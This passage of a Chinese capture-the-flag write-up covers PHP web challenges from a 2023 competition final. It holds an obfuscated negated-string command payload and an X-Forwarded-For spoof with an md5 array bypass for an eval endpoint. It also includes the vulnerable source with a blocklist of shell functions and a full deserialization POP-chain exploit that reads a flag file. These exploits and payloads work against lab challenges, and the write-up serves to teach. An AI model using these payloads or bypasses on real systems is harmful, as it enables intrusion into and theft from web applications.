class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>B%CD%<span class="hljs-number">98</span>%C6%B5%B8%<span class="hljs-number">97</span>%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">92</span>%AD%<span class="hljs-number">8</span>C%A5%A9%<span class="hljs-number">8</span>C%<span class="hljs-number">88</span>%A7%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%AD%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%BB%CF%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>E%B8%B9%<span class="hljs-number">8</span>A%A5%B8%<span class="hljs-number">87</span>%<span class="hljs-number">93</span>%A8%<span class="hljs-number">85</span>%B9%<span class="hljs-number">9</span>B%B0%<span class="hljs-number">88</span>%CF%B4%A5%A8%B1%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">86</span>%BE%<span class="hljs-number">96</span>%B5%B7%B5%<span class="hljs-number">90</span>%B6%BC%AD%CC%<span class="hljs-number">9</span>E%BC%BD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%B8%A9%<span class="hljs-number">8</span>A%A7%B8%CB%<span class="hljs-number">96</span>%B0%<span class="hljs-number">88</span>%CF%B4%<span class="hljs-number">9</span>B%<span class="hljs-number">92</span>%B9%<span class="hljs-number">86</span>%A7%CD%AD%CE%<span class="hljs-number">9</span>D%A7%BE%<span class="hljs-number">90</span>%B5%B8%<span class="hljs-number">97</span>%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">92</span>%AD%<span class="hljs-number">8</span>C%A5%AC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%CE%<span class="hljs-number">92</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B2%<span class="hljs-number">95</span>%BE%CA%B1%<span class="hljs-number">96</span>%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%A6%CD%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%B6%BC%B6%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%B9%<span class="hljs-number">87</span>%<span class="hljs-number">8</span>A%B6%<span class="hljs-number">95</span>%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">92</span>%A5%CC%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">93</span>%CF%A5%AC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>B%CD%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B5%CC%<span class="hljs-number">94</span>%<span class="hljs-number">91</span>%B4%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">98</span>%CF%B4%B5%B7%B5%<span class="hljs-number">93</span>%A6%A8%AE%C6%A5%<span class="hljs-number">91</span>%B5%<span class="hljs-number">93</span>%A6%A8%AE%<span class="hljs-number">90</span>%B5%B7%B5%<span class="hljs-number">90</span>%B3%BB%B6%<span class="hljs-number">88</span>%B1%BB%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>F%B0%<span class="hljs-number">88</span>%CF%B4%A5%A8%B1%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">86</span>%BE%<span class="hljs-number">96</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%<span class="hljs-number">96</span>%CB%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%CB%<span class="hljs-number">96</span>%A7%B8%CB%<span class="hljs-number">96</span>%B0%<span class="hljs-number">88</span>%CF%B4%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%CE%<span class="hljs-number">92</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B2%<span class="hljs-number">95</span>%BE%CF%B0%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%A6%CD%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%B6%BC%B6%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>E%AB%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%B9%<span class="hljs-number">87</span>%<span class="hljs-number">8</span>A%B6%<span class="hljs-number">95</span>%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BB%CF%<span class="hljs-number">96</span>%A7%BC%AD%CD%A6%A8%<span class="hljs-number">87</span>%CE%A5%AB%CF%<span class="hljs-number">96</span>%B3%<span class="hljs-number">91</span>%AD%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%A8%CF%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>C%CC%AD%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>B%B8%C6%<span class="hljs-number">8</span>D%B4%BC%AD%<span class="hljs-number">86</span>%A5%A8%B9%<span class="hljs-number">94</span>%B3%BC%B6%<span class="hljs-number">98</span>%AF%AC%B6%<span class="hljs-number">8</span>F%B4%AC%CB%<span class="hljs-number">91</span>%B0%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>C%C8%BB%AE%<span class="hljs-number">90</span>%B1%BC%<span class="hljs-number">92</span>%A9%<span class="hljs-number">95</span>%<span class="hljs-number">9</span>E%B8%C7%<span class="hljs-number">98</span>%B5%B8%C6%<span class="hljs-number">88</span>%B3%<span class="hljs-number">96</span>%B5%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>D%<span class="hljs-number">96</span>%B6%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">92</span>%B9%<span class="hljs-number">8</span>C%B4%BC%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%A6%CD%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%B6%BC%AD%CD%A6%A8%<span class="hljs-number">87</span>%CE%A5%AC%CB%<span class="hljs-number">96</span>%A7%B8%CB%<span class="hljs-number">96</span>%B3%<span class="hljs-number">96</span>%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BC%CB%<span class="hljs-number">96</span>%A7%B8%CB%<span class="hljs-number">96</span>%B0%<span class="hljs-number">88</span>%CF%B4%A5%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%A7%AD%<span class="hljs-number">93</span>%B4%BC%AD%CC%<span class="hljs-number">9</span>E%BC%<span class="hljs-number">87</span>%<span class="hljs-number">85</span>%<span class="hljs-number">9</span>B%B7%B5%CD%A6%A8%<span class="hljs-number">88</span>%<span class="hljs-number">90</span>%B5%B7%A5%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%B7%A9%<span class="hljs-number">93</span>%B4%AC%CA%AE%AC%B9%BD%<span class="hljs-number">99</span>%AD%AA%C6%B2%B4%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%AD%<span class="hljs-number">8</span>F%AF%AB%BE%C8%BB%AE%<span class="hljs-number">8</span>F%CC%<span class="hljs-number">9</span>E%B8%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>C%A5%AC%BE%<span class="hljs-number">90</span>%B5%B8%<span class="hljs-number">94</span>%C7%B2%<span class="hljs-number">95</span>%BE%<span class="hljs-number">88</span>%B4%A7%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%BE%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%CE%<span class="hljs-number">92</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B2%<span class="hljs-number">95</span>%BE%CF%B0%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%A5%A8%B1%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">86</span>%BE%<span class="hljs-number">96</span>%B5%B8%<span class="hljs-number">94</span>%C9%B5%B7%B5%<span class="hljs-number">93</span>%A6%A8%AD%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>D%<span class="hljs-number">96</span>%B6%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%B5%B8%C6%<span class="hljs-number">88</span>%AF%AC%B5%<span class="hljs-number">9</span>C%B5%B7%A5%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%B7%A9%<span class="hljs-number">93</span>%AF%AC%B6%<span class="hljs-number">8</span>A%<span class="hljs-number">9</span>B%B7%B5%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>D%AC%<span class="hljs-number">97</span>%<span class="hljs-number">85</span>%<span class="hljs-number">9</span>B%B7%B5%CF%<span class="hljs-number">9</span>D%CD%<span class="hljs-number">8</span>C%<span class="hljs-number">90</span>%B5%B7%B5%<span class="hljs-number">93</span>%A6%A8%AE%<span class="hljs-number">8</span>C%B6%<span class="hljs-number">96</span>%BE%C6%B6%<span class="hljs-number">96</span>%<span class="hljs-number">94</span>%<span class="hljs-number">8</span>F%B3%<span class="hljs-number">96</span>%<span class="hljs-number">9</span>C%C8%B5%<span class="hljs-number">85</span>%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%BE%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%B6%BC%BE%B1%BC%<span class="hljs-number">96</span>%BE%<span class="hljs-number">98</span>%B6%BC%BD%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">92</span>%B9%<span class="hljs-number">8</span>C%B4%BC%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%A5%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%A7%AD%<span class="hljs-number">93</span>%B4%BC%AD%CC%<span class="hljs-number">9</span>E%BC%<span class="hljs-number">87</span>%<span class="hljs-number">85</span>%<span class="hljs-number">9</span>B%B7%B5%CD%A6%A8%<span class="hljs-number">88</span>%<span class="hljs-number">90</span>%B5%B7%A5%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%B7%A9%<span class="hljs-number">93</span>%B4%AC%CA%AE%AC%B9%BD%<span class="hljs-number">99</span>%AD%AA%C6%B2%B4%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>E%AC%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>D%B0%<span class="hljs-number">88</span>%CF%B4%<span class="hljs-number">99</span>%AE%CF%B4%DD%DF%<span class="hljs-number">83</span>%DF%<span class="hljs-number">9</span>D%<span class="hljs-number">9</span>E%<span class="hljs-number">8</span>C%<span class="hljs-number">9</span>A%C9%CB%DF%D2%<span class="hljs-number">9</span>B%DF%C1%DF%D0%<span class="hljs-number">8</span>B%<span class="hljs-number">92</span>%<span class="hljs-number">8</span>F%D0%<span class="hljs-number">9</span>E%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%D6%DF%D9%D9%DF%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%DF%D0%<span class="hljs-number">8</span>B%<span class="hljs-number">92</span>%<span class="hljs-number">8</span>F%D0%<span class="hljs-number">9</span>E%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F);<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-web1-4.png"></p><h2 id="决赛-baby-md5"><a href="#决赛-baby-md5" class="headerlink" title="决赛[baby md5]"></a>决赛[baby md5]</h2><p>check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isRequestFromLocal</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// 定义本地IP地址</span><br>    <span class="hljs-variable">$localIP</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><br>    <span class="hljs-comment">// 获取客户端IP地址</span><br>    <span class="hljs-variable">$clientIP</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br><br>    <span class="hljs-comment">// 比较客户端IP地址与本地IP地址</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$clientIP</span> === <span class="hljs-variable">$localIP</span>) &#123;<br>        <span class="hljs-comment">// 请求来自本地</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 请求不来自本地</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;check.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">isRequestFromLocal</span>()) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello!&#x27;</span>;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/eval|shell_exec|system|proc_open|popen|pcntl_exec|\&#x27;|cat|include|whoami/i&quot;</span>,<span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$c</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Oh no, you are hacker!!!&#x27;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;failed&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ip验证用X-Forwarded-For，md5弱比较用数组绕过，正则匹配用取反绕过</p><p>payload：<code>X-Forwarded-For=127.0.0.1</code>,<code>cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);&amp;key1[]=1&amp;key2[]=2</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-js-web1-1.png"></p><h2 id="决赛-easy-serialize"><a href="#决赛-easy-serialize" class="headerlink" title="决赛[easy serialize]"></a>决赛[easy serialize]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in /flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">baby</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var3</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">learn</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-variable">$key</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAge</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;var2-&gt;var3;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">learn</span>(<span class="hljs-variable">$var</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">learn</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAge</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">young</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">old</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Okay, you get the key, but we send you &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;age&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;age&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>给定了flag位置，同时又有<code>file_get_contents</code>,那么就从learn函数入手。很明显<code>__invoke</code>调用了<code>learn</code>，传进去了可控的<code>$var</code>，而在<code>yong::__tostring</code>中可以触发<code>baby::__invoke</code>，<code>old::__get</code>中可以触发<code>yong::__tostring</code>，baby中的getAge又能触发<code>old::__get</code></p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">baby</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;/flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var3</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">learn</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-variable">$key</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAge</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;var2-&gt;var3;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">learn</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAge</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">young</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">old</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Okay, you get the key, but we send you &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">baby</span>();<br><span class="hljs-variable">$a</span>-&gt;var2 = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">old</span>();<br><span class="hljs-variable">$a</span>-&gt;var2-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">young</span>();<br><span class="hljs-variable">$a</span>-&gt;var2-&gt;<span class="hljs-keyword">var</span>-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">baby</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><h2 id="决赛-p2rce"><a href="#决赛-p2rce" class="headerlink" title="决赛[p2rce]"></a>决赛[p2rce]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 